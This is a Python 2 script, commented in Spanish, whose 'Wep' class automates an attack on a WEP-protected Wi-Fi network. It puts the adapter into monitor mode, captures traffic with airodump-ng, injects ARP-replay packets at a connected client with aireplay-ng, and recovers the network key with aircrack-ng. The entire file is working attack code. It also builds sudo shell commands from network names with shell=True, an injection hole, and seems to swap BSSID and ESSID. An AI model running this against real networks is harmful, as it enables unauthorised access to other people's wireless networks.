import os, sys
import subprocess
import time
import pandas as pd
import commands
import signal


class Wep():
	"""docstring fos Wep"""
	def __init__(self,red):
		self._red = red

	def red(self):
		return self._red
	
	def atacar(self):
		wlan = commands.getoutput('sudo airmon-ng check kill')
		comando = 'sudo airmon-ng start wlan0 '+self.red().channel()
		wlan = commands.getoutput(comando)
		nom = self.red().bssid()
		nom = nom.replace(" ","_")
		archivo =nom
		#archivo = './datos/'+nom+'/'+nom
		print('Ejecutando la captura de paquetes')
		comando = 'sudo airodump-ng --bssid '+str(self.red().essid())+' --channel '+str(self.red().channel())+' --write '+nom+' wlan0mon'
		#airodump = subprocess.Popen(['sudo','airodump-ng','--bssid',str(self.red().essid()),'--channel',str(self.red().channel()),'--write',archivo,'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=False,preexec_fn=os.setsid)
		airodump = subprocess.Popen([comando],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True,preexec_fn=os.setsid)
		time.sleep(30)
		nomArchivo = archivo+'-01.csv'
		dt = pd.read_csv(nomArchivo)
		if len(dt.get_values()) < 3 :
			print('No se encontro un host para la inyeccion de paquetes')
			self.red().set_contrasena('No hay host para la inyeccion de paquetes')
			os.killpg(os.getpgid(airodump.pid),signal.SIGTERM)
		else:
			print('Ejecutando la inyeccion de paquetes')
			comando = 'sudo aireplay-ng -3 -b'+self.red().essid()+' -h '+str(dt.get_values()[2][0])+' wlan0mon'
			print(str(dt.get_values()[2][0]))
			#airodump1 = subprocess.Popen(['sudo','aireplay-ng','-3','-b',self.red().essid(),'-h',str(dt.get_values()[2][0]),'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=False,preexec_fn=os.setsid)
			airodump1 = subprocess.Popen([comando],stderr=subprocess.PIPE,shell=True,preexec_fn=os.setsid)
			time.sleep(180)
			comando = 'sudo aircrack-ng '+archivo+'*.cap'
			print('Descifrando la contrasena')
			result = subprocess.Popen([comando],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True,preexec_fn=os.setsid)
			tiempo = 0
			termino = False
			while tiempo < 300:
				if result.poll() == None:
					tiempo = tiempo + 1
					time.sleep(1)
				else:
					termino = True
					break
			print(tiempo)
			if termino == True:
				salida,error =result.communicate()
				salida = str(salida.decode('utf-8'))
				print('Contrasena descifrada')
				print('salida :'+salida)
				self.red().set_contrasena(salida)
			else:
				result.terminate()
				result.kill()
				print('Caduco el tiempo del ataque, la contrasena no pudo ser descifrada')
				os.killpg(os.getpgid(result.pid),signal.SIGTERM)
				self.red().set_contrasena('El tiempo del ataque ha caducado y no se pudo recuperar la contrasena')
			airodump.terminate()
			airodump.kill()
			airodump1.terminate()
			airodump1.kill()
			os.killpg(os.getpgid(airodump.pid),signal.SIGTERM)
			os.killpg(os.getpgid(airodump1.pid),signal.SIGTERM)
			commands.getoutput('sudo rm replay_arp*')
			
		self.habilitarWlan()


	def habilitarWlan(self):
		wlan = commands.getoutput('sudo airmon-ng stop wlan0mon')
		wlan = commands.getoutput('sudo ifconfig wlan0 up')